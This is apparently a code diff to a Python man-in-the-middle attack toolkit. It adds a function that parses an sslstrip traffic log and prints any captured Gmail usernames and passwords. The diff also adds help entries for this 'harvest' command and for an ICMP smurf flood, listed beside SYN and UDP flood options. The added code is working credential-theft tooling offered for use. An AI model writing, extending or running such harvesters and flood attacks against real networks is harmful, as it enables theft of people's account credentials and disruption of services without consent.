@@ -54,6 +54,35 @@ def get_myip(interface):
 		struct.pack('256s', interface[:15])
 	)[20:24])
 
+def login_r(l):
+	flogin = l.split("Email=")
+	login = str(flogin[1]).split("&")
+	return login[0]
+
+def pass_r(l):
+	fpwd = l.split("Passwd=")
+	pwd = str(fpwd[1]).split("&")
+	return pwd[0]
+
+
+def sslstripharvest():
+	print "[$] SSL Strip Harvester - Only harvest gmail accounts (by now)."
+	try:
+		f = open("sslstrip.log","r+")
+		content = f.read().replace('\n','')
+	except:
+		print "[!] Problem reading the sslstrip log"
+	status = 0
+	if "Email=" in content:
+		login = login_r(str(content))
+		print "[$] Login Found: {}".format(login)
+		status = 1
+	if "Passwd=" in content:
+		pwd = pass_r(str(content))
+		print "[$] Password Found: {}".format(pwd)
+		status = 1
+	if status == 0:
+		print "[#] No gmail accounts on the pot try again later."
 
 def get_mymac(interface):
     	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -287,6 +316,13 @@ def print_help():
 	print color("  pythem> ","red") + "hstsbypass"
 	print
 	print
+	print color("[*] harvest			Harvest credentials in sslstrip log.","blue")
+	print
+	print color(" example:","green")
+	print
+	print color("  pythem> ","red") + "harvest"
+	print
+	print
 	print color("[*] inject			Start and redirect clients to web server with a script to inject in header field","blue")
 	print
 	print "Should be used after a ARP spoof has been started"
@@ -334,11 +370,13 @@ def print_help():
 	print
 	print color(" arguments:","red")
 	print
-	print color("  - dnsdrop             | Start to drop DNS queries that pass through man-in-the-middle traffic.","yellow")
+	print color("  - dnsdrop           | Start to drop DNS queries that pass through man-in-the-middle traffic.","yellow")
 	print
 	print color("  - synflood	      | Start a SYN flood attack on target host, default port = 80, set port to change.","yellow")
 	print
 	print color("  - udpflood	      | Start a UDP flood attack on target host, default port = 80, set port to change.","yellow")
+	print
+	print color("  - icmpsmurf	      | Start a ICMP smurf attack on target host. send echo-requests to broadcast with target address.","yellow")
 	print
 	print color(" examples:","green")
 	print
@@ -357,7 +395,7 @@ def print_help():
 	print
 	print color(" arguments:","red")
 	print
-	print color("  - stdin		| set file before","yellow")
+	print color("  - stdin	| set file before","yellow")
  	print color("  - tcp		| set target before","yellow")
 	print
   	print color(" examples:","green")
@@ -384,7 +422,7 @@ def print_help():
 	print
 	print color("  - ssh		| ip address as target","yellow")
 	print color("  - url		| url (with http:// or https://) as target","yellow")
- 	print color("  - form		| url (with http:// or https://) as target","yellow")
+ 	print color("  - form	| url (with http:// or https://) as target","yellow")
 	print
   	print color(" examples:","green")
 	print
